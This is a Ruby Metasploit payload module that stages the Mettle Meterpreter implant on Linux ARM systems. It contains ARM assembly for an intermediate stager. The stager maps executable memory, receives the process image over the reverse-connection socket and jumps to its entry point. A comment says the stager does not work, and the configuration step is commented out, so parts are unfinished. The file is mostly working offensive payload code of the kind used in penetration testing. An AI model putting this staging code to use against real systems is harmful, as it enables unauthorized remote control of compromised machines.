##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/meterpreter_armle_linux'
require 'msf/base/sessions/meterpreter_options'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Meterpreter',
      'Description'   => 'Inject the mettle server payload (staged)',
      'Author'        => [
        'Adam Cammack <adam_cammack[at]rapid7.com'
      ],
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_armle_Linux))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
    ep = elf.elf_header.e_entry
    return ep
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    encoded_entry = "0x%.8x" % entry_offset
    encoded_size = "0x%.8x" % payload.length

    # Does a mmap() / read() loop of a user specified length, then
    # jumps to the entry point (the \x5a's)

    # TODO: does not work because fuck Metasm
    midstager_asm = %Q^
        ; mmap the space for the mettle image
        mov r0, #0      ; address doesn't matter
        mov r1, [size]  ; more than 12-bits
        mov r2, #7      ; PROT_READ | PROT_WRITE | PROT_EXECUTE
        mov r3, #34     ; MAP_PRIVATE | MAP_ANONYMOUS
        mov r4, #0      ; no file
        mov r5, #0      ; no offset

        mov r7, #90     ; syscall: mmap
        svc #0

        ; recv the process image
        ; ip contains our socket from the reverse stager
        mov r1, r0      ; move the mmap to the recv buffer
        mov r0, ip      ; set the fd
        mov r2, [size]  ; I, too, like to live dangerously
        mov r3, 0x100   ; MSG_WAITALL

        mov r7, #291    ; syscall: recv
        svc #0

        ; set up the initial stack
        and sp, #-16    ; Align
        add sp, #256    ; Add room for initial stack
        add sp, #4      ; Add room for prog name
        mov r4, #109    ;  "m" (0,0,0,109)
        push {r4}       ; On the stack
        mov r5,#1       ; ARGC
        mov r6,sp       ; ARGV[0]
        mov r7,#0       ; (NULL)
        mov r8,#0       ; (NULL) (Ending ENV)
        mov r9,#7       ; AT_BASE
        mov r10,r1      ; mmap'd address
        mov r11,#0      ; AT_NULL
        mov r12,#0
        push {r5-r12}

        ; hack the planet
        add r0, r1, [entry]
        bx r0

        entry: .word #{encoded_entry}
        size:  .word #{encoded_size}
    ^
    midstager = Metasm::Shellcode.assemble(Metasm::ARM.new, midstager_asm).encode_string

    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
    conn.put(midstager)
    Rex::ThreadSafe.sleep(1.5)

    # Send length of payload
    #conn.put([ payload.length ].pack('V'))
    return true

  end

  def generate_stage(opts={})
    meterpreter = generate_meterpreter
    #config = generate_config(opts)
    #meterpreter + config
  end

  def generate_meterpreter
    MetasploitPayloads.read('meterpreter', 'mettle-armle.bin')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      :arch       => opts[:uuid].arch,
      :exitfunk   => nil,
      :expiration => datastore['SessionExpirationTimeout'].to_i,
      :uuid       => opts[:uuid],
      :transports => [transport_config(opts)],
      :extensions => [],
      :ascii_str  => true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end
